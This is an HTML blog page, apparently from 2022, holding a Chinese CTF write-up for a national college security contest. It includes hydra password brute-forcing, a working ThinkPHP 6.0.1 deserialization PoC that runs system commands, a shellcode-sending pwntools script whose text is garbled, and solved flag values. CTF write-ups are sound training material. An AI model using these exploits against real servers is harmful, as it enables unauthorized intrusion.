@@ -1,0 +1,448 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>第十五届全国大学生信息安全竞赛创新实践能力赛 | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="基于挑战码的双向认证1 这两个应该是属于非预期，查找文件内容，两个flag都出了： find / |xargs grep -ri flag{ 2&gt;/dev/null flag{34f5fdaf-c373-47fd-afab-01ed2914c11a} 基于挑战码的双向认证2 解题步骤同上 基于挑战码">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/281/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/281/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="第十五届全国大学生信息安全竞赛创新实践能力赛" />
+<meta property="og:description" content="基于挑战码的双向认证1 这两个应该是属于非预期，查找文件内容，两个flag都出了： find / |xargs grep -ri flag{ 2&gt;/dev/null flag{34f5fdaf-c373-47fd-afab-01ed2914c11a} 基于挑战码的双向认证2 解题步骤同上 基于挑战码" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/281/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-05-29T13:48:21+00:00" />
+<meta property="article:modified_time" content="2022-05-29T13:48:21+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="第十五届全国大学生信息安全竞赛创新实践能力赛"/>
+<meta name="twitter:description" content="基于挑战码的双向认证1 这两个应该是属于非预期，查找文件内容，两个flag都出了： find / |xargs grep -ri flag{ 2&gt;/dev/null flag{34f5fdaf-c373-47fd-afab-01ed2914c11a} 基于挑战码的双向认证2 解题步骤同上 基于挑战码"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "第十五届全国大学生信息安全竞赛创新实践能力赛",
+      "item": "https://a10nggg.github.io/archives/281/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "第十五届全国大学生信息安全竞赛创新实践能力赛",
+  "name": "第十五届全国大学生信息安全竞赛创新实践能力赛",
+  "description": "基于挑战码的双向认证1 这两个应该是属于非预期，查找文件内容，两个flag都出了： find / |xargs grep -ri flag{ 2\u0026gt;/dev/null flag{34f5fdaf-c373-47fd-afab-01ed2914c11a} 基于挑战码的双向认证2 解题步骤同上 基于挑战码",
+  "keywords": [
+    
+  ],
+  "articleBody": "基于挑战码的双向认证1 这两个应该是属于非预期，查找文件内容，两个flag都出了：\nfind / |xargs grep -ri flag{ 2\u003e/dev/null\nflag{34f5fdaf-c373-47fd-afab-01ed2914c11a}\n基于挑战码的双向认证2 解题步骤同上\n基于挑战码的双向认证3 操作内容：\n使用hydra爆破获得root密码toor。\n登陆查找（find / |xargs grep -ri flag{ 2\u003e/dev/null）获得flag\nflag{7b352ef0-1bb1-41af-a7d7-b74f62ff23f0}\nISO9798 爆破sha256老脚本套路了 import hashlib dic = '0123456789abcdefghijklmnopqrstuvwxyzQAZWSXEDCRFVTGBYHNUJMIKOPL' for a in dic: for b in dic: for c in dic: for d in dic: t = str(a)+str(b)+str(c)+str(d)+'EvLOXDipk6pWH7ci' #print(t) sha256=hashlib.sha256(t.encode(“utf8”)).hexdigest() #print(sha256) if sha256 == 'ca0dddf277edecadf0de6f6c6c99ee2664a736ad847f8a345970a6f233eb6910': print(t) break\n结合后面的题这个值就传0，使其rb为0\n然后他给的是rA||rB||B加密的结果,要我们给rB||rA.,猜测是ECB模式加密。,所以直接将第一块和第二块换一下位置即可\n最终得到flag，\nflag{0fc5a96c-16e5-497e-955a-3e7356bd549c}\nEzpop 存在源码泄露，访问www.zip拿到源码，在app/controller/Index.php中发现test控制器存在一个用户可控的反序列化输入点\n利用ThinKPHP6.0.1的反序列化漏洞利用链构造后成功在根目录下获取flag，POC如下\n\u003c?php namespace think{ abstract class Model{ private $lazySave = false; private $data = []; private $exists = false; protected $table; private $withAttr = []; protected $json = []; protected $jsonAssoc = false; function __construct($obj = ''){ $this-\u003elazySave = True; $this-\u003edata = ['whoami' =\u003e ['cat /flag.txt']]; $this-\u003eexists = True; $this-\u003etable = $obj; $this-\u003ewithAttr = ['whoami' =\u003e ['system']]; $this-\u003ejson = ['whoami',['whoami']]; $this-\u003ejsonAssoc = True; } } } namespace think\\model{ use think\\Model; class Pivot extends Model{ } } namespace{ echo(urlencode(serialize(new think\\model\\Pivot(new think\\model\\Pivot())))); } flag{8c3f66f3-f3ca-4b6e-be63-9230376498fc}\nlogin-nomal 其实就是一个菜单逆向题目，首先进入1之后修改flag标志，然后进入2发送可见shellcode（shellcode自己构造就行） from RemoteServerwn imRemoteServerort * ShellCode = \"Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0RemoteServer160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8RemoteServer115l1n0J0h0a071N00\" def main(): context(log_level=\u0026#039;debug\u0026#039;, arch=\u0026#039;amd64\u0026#039;, os=\u0026#039;linux\u0026#039;) #RemoteServer = RemoteServerrocess(\"./login\") RemoteServer = remote(\"101.201.144.230\", 24613) libc = ELF(\u0026#039;./libc-2.33.so\u0026#039;) RemoteServerayload1 = \u0026#039;ORemoteServerT:1\\nMSG:ro0ta\\n\u0026#039; RemoteServerayload2 = \u0026#039;ORemoteServerT:2\\nMSG:\u0026#039;+ShellCode+\"\\n\" RemoteServer.recvuntil(\"\u003e\u003e\u003e \") RemoteServer.sendline(RemoteServerayload1) RemoteServer.recvuntil(\"\u003e\u003e\u003e \") RemoteServer.sendline(RemoteServerayload2) RemoteServer.interactive() if __name__ == \"__main__\": main() flag{7d4521c1-4789-4365-8475-86cb048eeaf1}\nez_usb 通过wireshark打开发现存在两种usb的流量信息，通过过滤全选导出分组将其另存，过滤语法为usb.src ==“2.10.1\"和usb.src ==“2.8.1” 利用UsbKeyboardDataHacker.py脚本（github上可找）对其解密获得压缩包的十六进制和压缩包的密码\n整理压缩包的十六进制，置空，删除前的一个字母c，保存后解压得到flag\nflag{20de17cc-d2c1-4b61-bebd-41159ed7172d} 签到 打开链接根据摩斯密码表点击三次按钮输入s启动，根据公众号的提示和密码本进行模十算法，如图\n根据提示将得出的数据发包即可得到flag\nflag{59727c32-14c9-4bf1-9c65-cbeae9d8a247} 问卷调查 填写问卷即可得到flag。\nflag{Thanksforplayingourgames everlasting_night 根据提示，用stegsolve进行分析，挨个查看，得到一串字符串\n对其进行尝试lsb隐写解密，\n查看文件内容，可以知道是加密的zip文件\n在图片最后多余处，得到一串md5,MD5破解得到压缩包密码\n解压得到flag的图片，用GIMP打开看到flag，但是不方便读，PS修改一下，得到flag flag{607f41da-e849-4c0b-8867-1b3c74536cc4} ",
+  "wordCount" : "1033",
+  "inLanguage": "en",
+  "datePublished": "2022-05-29T13:48:21Z",
+  "dateModified": "2022-05-29T13:48:21Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/281/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      第十五届全国大学生信息安全竞赛创新实践能力赛
+    </h1>
+    <div class="post-meta"><span title='2022-05-29 13:48:21 +0000 +0000'>May 29, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><h2 id="基于挑战码的双向认证1">基于挑战码的双向认证1<a hidden class="anchor" aria-hidden="true" href="#基于挑战码的双向认证1">#</a></h2>
+<p><img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image001.png" alt=""  />
+<br>
+这两个应该是属于非预期，查找文件内容，两个flag都出了：</p>
+<p>find / |xargs grep -ri flag{ 2&gt;/dev/null<br>
+flag{34f5fdaf-c373-47fd-afab-01ed2914c11a}</p>
+<h2 id="基于挑战码的双向认证2">基于挑战码的双向认证2<a hidden class="anchor" aria-hidden="true" href="#基于挑战码的双向认证2">#</a></h2>
+<p>解题步骤同上</p>
+<h2 id="基于挑战码的双向认证3">基于挑战码的双向认证3<a hidden class="anchor" aria-hidden="true" href="#基于挑战码的双向认证3">#</a></h2>
+<p>操作内容：</p>
+<p>使用hydra爆破获得root密码toor。<br>
+<img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image003.png" alt=""  />
+<br>
+登陆查找（find / |xargs grep -ri flag{ 2&gt;/dev/null）获得flag<br>
+<img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image005.png" alt=""  />
+</p>
+<p>flag{7b352ef0-1bb1-41af-a7d7-b74f62ff23f0}</p>
+<h2 id="iso9798">ISO9798<a hidden class="anchor" aria-hidden="true" href="#iso9798">#</a></h2>
+<ol>
+<li>
+<p>爆破sha256老脚本套路了
+import hashlib
+dic = '0123456789abcdefghijklmnopqrstuvwxyzQAZWSXEDCRFVTGBYHNUJMIKOPL'
+for a in dic:
+for b in dic:
+for c in dic:
+for d in dic:
+t = str(a)+str(b)+str(c)+str(d)+'EvLOXDipk6pWH7ci'
+#print(t)
+sha256=hashlib.sha256(t.encode(&ldquo;utf8&rdquo;)).hexdigest()
+#print(sha256)
+if sha256 == 'ca0dddf277edecadf0de6f6c6c99ee2664a736ad847f8a345970a6f233eb6910':
+print(t)
+break</p>
+</li>
+<li>
+<p>结合后面的题这个值就传0，使其rb为0<br>
+<img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image007.png" alt=""  />
+</p>
+</li>
+<li>
+<p>然后他给的是rA||rB||B加密的结果,要我们给rB||rA.,猜测是ECB模式加密。,所以直接将第一块和第二块换一下位置即可<br>
+<img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image009.png" alt=""  />
+<br>
+最终得到flag，</p>
+</li>
+</ol>
+<p>flag{0fc5a96c-16e5-497e-955a-3e7356bd549c}</p>
+<h2 id="ezpop">Ezpop<a hidden class="anchor" aria-hidden="true" href="#ezpop">#</a></h2>
+<ol>
+<li>存在源码泄露，访问www.zip拿到源码，在app/controller/Index.php中发现test控制器存在一个用户可控的反序列化输入点<br>
+<img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image011.png" alt=""  />
+<br>
+利用ThinKPHP6.0.1的反序列化漏洞利用链构造后成功在根目录下获取flag，POC如下</p>
+   <?php
+   namespace think{
+   abstract class Model{
+       private $lazySave = false;
+       private $data = [];
+       private $exists = false;
+       protected $table;
+       private $withAttr = [];
+       protected $json = [];
+       protected $jsonAssoc = false;
+       function __construct($obj = &#039;&#039;){
+           $this->lazySave = True;
+           $this->data = [&#039;whoami&#039; => [&#039;cat /flag.txt&#039;]];
+           $this->exists = True;
+           $this->table = $obj;
+           $this->withAttr = [&#039;whoami&#039; => [&#039;system&#039;]];
+           $this->json = [&#039;whoami&#039;,[&#039;whoami&#039;]];
+           $this->jsonAssoc = True;
+       }
+   }
+   }
+   namespace think\model{
+   use think\Model;
+   class Pivot extends Model{
+   }
+   }
+   namespace{
+   echo(urlencode(serialize(new think\model\Pivot(new think\model\Pivot()))));
+   }
+
+</li>
+</ol>
+<p><img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image013.png" alt=""  />
+</p>
+<p>flag{8c3f66f3-f3ca-4b6e-be63-9230376498fc}</p>
+<h2 id="login-nomal">login-nomal<a hidden class="anchor" aria-hidden="true" href="#login-nomal">#</a></h2>
+<ol>
+<li>其实就是一个菜单逆向题目，首先进入1之后修改flag标志，然后进入2发送可见shellcode（shellcode自己构造就行）</li>
+</ol>
+<pre><code>from RemoteServerwn imRemoteServerort *
+
+ShellCode = &quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0RemoteServer160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8RemoteServer115l1n0J0h0a071N00&quot;
+
+def main():
+    context(log_level=&amp;#039;debug&amp;#039;, arch=&amp;#039;amd64&amp;#039;, os=&amp;#039;linux&amp;#039;)
+    #RemoteServer = RemoteServerrocess(&quot;./login&quot;)
+    RemoteServer = remote(&quot;101.201.144.230&quot;, 24613)
+    libc = ELF(&amp;#039;./libc-2.33.so&amp;#039;)
+
+    RemoteServerayload1 = &amp;#039;ORemoteServerT:1\nMSG:ro0ta\n&amp;#039;
+    RemoteServerayload2 = &amp;#039;ORemoteServerT:2\nMSG:&amp;#039;+ShellCode+&quot;\n&quot;
+    RemoteServer.recvuntil(&quot;&gt;&gt;&gt; &quot;)
+    RemoteServer.sendline(RemoteServerayload1)
+    RemoteServer.recvuntil(&quot;&gt;&gt;&gt; &quot;)
+    RemoteServer.sendline(RemoteServerayload2)
+
+    RemoteServer.interactive()
+
+if __name__ == &quot;__main__&quot;:
+    main()
+</code></pre>
+<p><img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image015.png" alt=""  />
+<br>
+flag{7d4521c1-4789-4365-8475-86cb048eeaf1}</p>
+<h2 id="ez_usb">ez_usb<a hidden class="anchor" aria-hidden="true" href="#ez_usb">#</a></h2>
+<ol>
+<li>通过wireshark打开发现存在两种usb的流量信息，通过过滤全选导出分组将其另存，过滤语法为usb.src ==&ldquo;2.10.1&quot;和usb.src ==&ldquo;2.8.1”</li>
+<li>利用UsbKeyboardDataHacker.py脚本（github上可找）对其解密获得压缩包的十六进制和压缩包的密码<br>
+<img loading="lazy" src="http://blog.a10ng.top/uploads/2022/05/image017.png" alt=""  />
+</li>
+<li>整理压缩包的十六进制，置空&lt;CAP&gt;，删除&lt;DEL&gt;前的一个字母c，保存后解压得到flag<br /> <img src="http://blog.a10ng.top/uploads/2022/05/image019.png" alt="" /><br /> flag{20de17cc-d2c1-4b61-bebd-41159ed7172d}</li> </ol></li>
+</ol>
+  <h2>
+        签到
+      </h2>
+  <p>
+        打开链接根据摩斯密码表点击三次按钮输入s启动，根据公众号的提示和密码本进行模十算法，如图<br /> <img src="http://blog.a10ng.top/uploads/2022/05/image021.png" alt="" /><br /> 根据提示将得出的数据发包即可得到flag<br /> <img src="http://blog.a10ng.top/uploads/2022/05/image023.png" alt="" /><br /> flag{59727c32-14c9-4bf1-9c65-cbeae9d8a247}
+      </p>
+  <h2>
+        问卷调查
+      </h2>
+  <p>
+        填写问卷即可得到flag。<br /> <img src="http://blog.a10ng.top/uploads/2022/05/Pasted.png" alt="" />
+      </p>
+  <p>
+        flag{Thanksforplayingourgames
+      </p>
+  <h2>
+        everlasting_night
+      </h2>
+  <p>
+        根据提示，用stegsolve进行分析，挨个查看，得到一串字符串<br /> <img src="http://blog.a10ng.top/uploads/2022/05/Pasted-1.png" alt="" /><br /> 对其进行尝试lsb隐写解密，<br /> <img src="http://blog.a10ng.top/uploads/2022/05/image031.png" alt="" /><br /> 查看文件内容，可以知道是加密的zip文件<br /> 在图片最后多余处，得到一串md5,MD5破解得到压缩包密码<br /> <img src="http://blog.a10ng.top/uploads/2022/05/image033.png" alt="" /><br /> <img src="http://blog.a10ng.top/uploads/2022/05/Pasted-2.png" alt="" />
+      </p>
+  <p>
+        解压得到flag的图片，用GIMP打开看到flag，但是不方便读，PS修改一下，得到flag
+      </p>
+  <p>
+        <img src="http://blog.a10ng.top/uploads/2022/05/Pasted-3.png" alt="" />
+      </p>
+  <p>
+        flag{607f41da-e849-4c0b-8867-1b3c74536cc4}
+      </p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
